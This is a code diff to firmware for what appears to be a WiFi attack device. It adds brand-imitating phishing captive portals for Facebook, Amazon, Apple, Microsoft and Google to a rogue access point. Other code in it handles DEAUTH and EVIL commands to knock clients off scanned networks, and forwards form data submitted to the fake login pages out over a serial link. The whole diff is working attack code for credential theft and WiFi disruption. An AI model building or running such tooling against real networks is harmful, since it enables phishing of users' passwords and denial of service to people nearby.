@@ -6,10 +6,22 @@
 #include "WiFi.h"
 
 //Captive portals
-#include "facebook.h"
-#include "amazon.h"
-#include "apple.h"
-#include "default.h"
+#include "portals/compressed/facebook.h"
+#include "portals/compressed/amazon.h"
+#include "portals/compressed/apple.h"
+#include "portals/compressed/microsoft.h"
+#include "portals/compressed/google.h"
+#include "portals/default.h"
+
+enum portals{
+  Default,
+  Facebook,
+  Amazon,
+  Apple,
+  Microsoft,
+  Google
+};
+
 
 //DNS
 
@@ -20,20 +32,9 @@
 
 #define BAUD 115200
 
-//DNS
+//PORTALS
 
 
-
-
-
-
-
-enum portals{
-  Default,
-  Facebook,
-  Amazon,
-  Apple
-};
 
 
 typedef struct {
@@ -126,6 +127,18 @@ bool serveBegined =false;
 
 
 void createAP(char* ssid, char* channel, char* password){
+  int mode;
+  const char* ifname = WLAN0_NAME;
+  wext_get_mode(ifname, &mode);
+
+  Serial.print("WLAN 0 ");
+  Serial.println(mode);
+
+  ifname = WLAN1_NAME;
+  wext_get_mode(ifname, &mode);
+  Serial.print("WLAN 1 ");
+  Serial.println(mode);
+
 
   DEBUG_SER_PRINT("CREATING AP");
   DEBUG_SER_PRINT(ssid);
@@ -145,11 +158,20 @@ void createAP(char* ssid, char* channel, char* password){
   //Creamos un nuevo servicio de dns
   start_DNS_Server();
   if(!serveBegined){
-    
     server.begin();
     serveBegined=true;
   }
   apActive = true;
+  ifname = WLAN0_NAME;
+  wext_get_mode(ifname, &mode);
+
+  Serial.print("WLAN 0 ");
+  Serial.println(mode);
+
+  ifname = WLAN1_NAME;
+  wext_get_mode(ifname, &mode);
+  Serial.print("WLAN 1 ");
+  Serial.println(mode);
 }
 void createAP(char* ssid, char* channel){
 
@@ -187,45 +209,89 @@ void destroyAP(){
 }
 
 
-String makeResponse(int code, String content_type) {
+String makeResponse(int code, String content_type, bool compresed) {
   String response = "HTTP/1.1 " + String(code) + " OK\n";
+  if(compresed)
+  response += "Content-Encoding: gzip\n";
   response += "Content-Type: " + content_type + "\n";
   response += "Connection: close\n\n";
   return response;
 }
 
+void handle404(WiFiClient &client) {
+  String response = makeResponse(404, "text/plain",false);
+  response += "Not found!";
+  client.write(response.c_str());
+}
+
+
 void handleRequest(WiFiClient &client,enum portals portalType,String ssid){
   const char *webPage;
+  size_t len;
+  bool compresed = false;
   switch(portalType){
     case Default:
       webPage = default_web(ssid);
+      len = strlen(webPage);
       break;
     case Facebook:
-      webPage = facebook;
+      webPage = (const char*)facebook;
+      len = facebook_len;
       break;
     case Amazon:
-      webPage = amazon;
+      webPage = (const char*)amazon;
+      len = amazon_len;
       break;
     case Apple:
-      webPage = apple;
+      webPage = (const char *)apple;
+      len = apple_len;
+      break;
+    case Google:
+      webPage = (const char *)google;
+      len = google_len;
+      break;
+    case Microsoft:
+      webPage = (const char *)microsoft;
+      len = microsoft_len;
       break;
     default:
       webPage = default_web(ssid);
   }
-
-  String response = makeResponse(200, "text/html");
-  client.write(response.c_str());
-  size_t len = strlen(webPage);
-
-  size_t chunkSize = 10000;  
-  for (size_t i = 0; i < len; i += chunkSize) {
-        size_t sendSize = MIN(chunkSize, len - i); 
-
-        client.write((const uint8_t *)(webPage + i), sendSize);
-        delay(10);  
+  Serial.print("Heap libre header:");
+  Serial.println(xPortGetFreeHeapSize());
+  if(webPage[0]==0x1f && webPage[1]==0x8b){
+    compresed=true;
   }
+  
+  String response = makeResponse(200, "text/html", compresed);
+  client.write(response.c_str());
+  
+   
+
+  size_t chunkSize = 5000;
+
+  for (size_t i = 0; i < len; i += chunkSize) {
+        size_t sendSize = MIN(chunkSize, len - i);
+        while(client.available()){
+            client.read();
+            delay(10);
+            }
+            Serial.print("Heap libre write:");
+        Serial.println(xPortGetFreeHeapSize());
+        if(client.connected()){
+          client.write((const uint8_t *)(webPage + i), sendSize);
+          if(client.getWriteError())return;
+        }else{
+          return;
+        }
+        delay(1);
+  }
+
   delay(10);
-  //client.flush();
+   while(client.available()){
+            client.read();
+            delay(1);
+            }
 }
 
 int scanNetworks(int miliseconds) {
@@ -271,7 +337,6 @@ void setup() {
 String ssid="";
 uint32_t current_num = 0;
 
-bool clientServing = false;
 void loop() {
   while (Serial1.available()) {
     delay(3);  //delay to allow buffer to fill 
@@ -420,13 +485,13 @@ void loop() {
       }
        
     }else if(readString.substring(0,6)=="DEAUTH" || readString.substring(0,4)=="EVIL"){
-      unsigned int numStation;
+      int numStation;
       if(readString.substring(0,4)=="EVIL"){
         numStation = readString.substring(5,readString.length()-1).toInt();
       }else{
         numStation = readString.substring(7,readString.length()-1).toInt();
       }
-      if(numStation < scan_results.size()&&numStation >=0){
+      if(numStation < (int)scan_results.size()&&numStation >=0){
         DEBUG_SER_PRINT("Deauthing "+(String)numStation+"\n");
         deauth_wifis.push_back(numStation);
         DEBUG_SER_PRINT("Deauthing "+scan_results[numStation].ssid+"\n");
@@ -544,52 +609,85 @@ void loop() {
 
   }
   
-if (apActive) {
-  WiFiClient client = server.available();
+  if (apActive) {
+    WiFiClient client = server.available();
+    if (client) {
+      //client.setRecvTimeout(500);
+      String request;
+      request.reserve(256);  // Reservamos memoria para evitar fragmentación
+      /*
+      struct tcp_pcb *tcp;
+      for (tcp = tcp_tw_pcbs; tcp != NULL; tcp = tcp->next) {
+        if (tcp->local_port == 80) tcp->local_port = localPortNew++;
+        tcp_close(tcp);
+      }
+      */
 
-  if (client) {
-    String request;
-    request.reserve(256);  // Reservamos memoria para evitar fragmentación
-
-    unsigned long startTime = millis();
-    while (client.connected() && (millis() - startTime < 300)) {
-      if (client.available()) {
-        char character = client.read();
-        request += character;
-
-        if (character == '\n') {
-          while (client.available()) client.read(); // limpia buffer
+      while (client.connected()) {
+        if (client.available()) {
+          char character = client.read();
+          if (character == '\n') {
+            while(client.available()){
+            character=client.read();
+            client.clearWriteError();
+            
+            delay(1);
+            }
+            String path = parseRequest(request);
+            Serial.println(request);
+            if(path.startsWith("/generate_204")||path.startsWith("/ncsi.txt")||path.startsWith("/success.html")||path.startsWith("/userinput")||path.startsWith("/login")||path.startsWith("/?")||path.equals("/")||path.startsWith("/get")){
+              if (deauth_wifis.size() != 0)
+                handleRequest(client, (enum portals)portal, scan_results[deauth_wifis[0]].ssid);
+              else
+                handleRequest(client, (enum portals)portal, "router");
+              if (path.indexOf('?') && (path.indexOf('=') > path.indexOf('?'))) {
+                String datos = path.substring(path.indexOf('?') + 1);
+                if (datos.length() > 0) {
+                  Serial1.print("EV:");
+                  Serial1.println(datos);
+                }
+              }
+          }else{
+            handle404(client);
+          }   
           break;
+
+          }else if(character == '%'){
+            char buff[2] ;
+            client.read(buff,2);
+            char value = (char)strtol(buff, NULL, 16);
+            if(value <= 127){
+              character = value;
+            }else{
+              request += "%";
+              request += buff[0];
+              request += buff[1];
+            }
+
+          } 
+          request += character;
+
+          
+          delay(10);
         }
-      } else {
-        delay(1);
       }
-    }
+      
 
-    // Opcional: forzar limpieza de conexiones TIME-WAIT (solo si es necesario)
-    struct tcp_pcb *tcp;
-    for (tcp = tcp_tw_pcbs; tcp != NULL; tcp = tcp->next) {
-      if (tcp->local_port == 80) tcp->local_port = localPortNew++;
-      tcp_close(tcp);
-    }
-
-    String path = parseRequest(request);
-    if (deauth_wifis.size() != 0)
-      handleRequest(client, (enum portals)portal, scan_results[deauth_wifis[0]].ssid);
-    else
-      handleRequest(client, (enum portals)portal, "router");
-
-    if (path.indexOf('?') && (path.indexOf('=') > path.indexOf('?'))) {
-      String datos = path.substring(path.indexOf('?') + 1);
-      if (datos.length() > 0) {
-        Serial1.print("EV:");
-        Serial1.println(datos);
+      // Opcional: forzar limpieza de conexiones TIME-WAIT (solo si es necesario)
+      /*
+      struct tcp_pcb *tcp;
+      for (tcp = tcp_tw_pcbs; tcp != NULL; tcp = tcp->next) {
+        if (tcp->local_port == 80) tcp->local_port = localPortNew++;
+        tcp_close(tcp);
       }
-    }
+      */
 
-    delay(50);  // menor delay, no saturar
-    client.stop();
+      
+
+      delay(50);  // menor delay, no saturar
+      client.stop();
+
+    }
   }
-}
   
 }
